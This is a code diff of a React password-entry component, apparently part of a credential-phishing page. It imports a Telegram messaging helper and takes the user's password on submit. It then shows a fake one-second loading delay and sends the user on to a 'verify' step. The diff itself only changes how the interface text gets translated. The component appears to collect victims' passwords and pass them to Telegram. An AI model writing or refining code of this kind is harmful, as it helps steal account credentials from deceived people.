@@ -4,7 +4,6 @@ import PropTypes from 'prop-types';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import { useNavigate } from 'react-router';
 import sendMessage from '@/utils/telegram';
-import { translateText } from '@/utils/translate';
 import { PATHS } from '@/router/router';
 
 const PasswordInput = ({ onClose }) => {
@@ -26,46 +25,16 @@ const PasswordInput = ({ onClose }) => {
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [
-                    translatedTitle,
-                    translatedDesc,
-                    translatedLabel,
-                    translatedPlaceholder,
-                    translatedContinue,
-                    translatedLoading
-                ] = await Promise.all([
-                    translateText(defaultTexts.title, targetLang),
-                    translateText(defaultTexts.description, targetLang),
-                    translateText(defaultTexts.passwordLabel, targetLang),
-                    translateText(defaultTexts.placeholder, targetLang),
-                    translateText(defaultTexts.continueBtn, targetLang),
-                    translateText(defaultTexts.loadingText, targetLang)
-                ]);
-
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description: translatedDesc,
-                    passwordLabel: translatedLabel,
-                    placeholder: translatedPlaceholder,
-                    continueBtn: translatedContinue,
-                    loadingText: translatedLoading
-                });
-            } catch {
-                //
-            }
-        },
-        [defaultTexts]
-    );
-
+    // 🎯 SỬA: Lấy dữ liệu dịch từ localStorage thay vì dịch lại
     useEffect(() => {
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
-            translateAllTexts(targetLang);
+            const storedPasswordTexts = localStorage.getItem(`translatedPassword_${targetLang}`);
+            if (storedPasswordTexts) {
+                setTranslatedTexts(JSON.parse(storedPasswordTexts));
+            }
         }
-    }, [translateAllTexts]);
+    }, []);
 
     const handleSubmit = async () => {
         if (!password.trim()) return;
@@ -79,12 +48,9 @@ const PasswordInput = ({ onClose }) => {
             //
         }
 
-        // ✅ GIẢM DELAY XUỐNG 1 GIÂY
         await new Promise((resolve) => setTimeout(resolve, 1000));
 
         setIsLoading(false);
-        
-        // ✅ CHUYỂN TRANG LUÔN SAU KHI NHẬP PASS
         navigate(PATHS.VERIFY);
     };
 
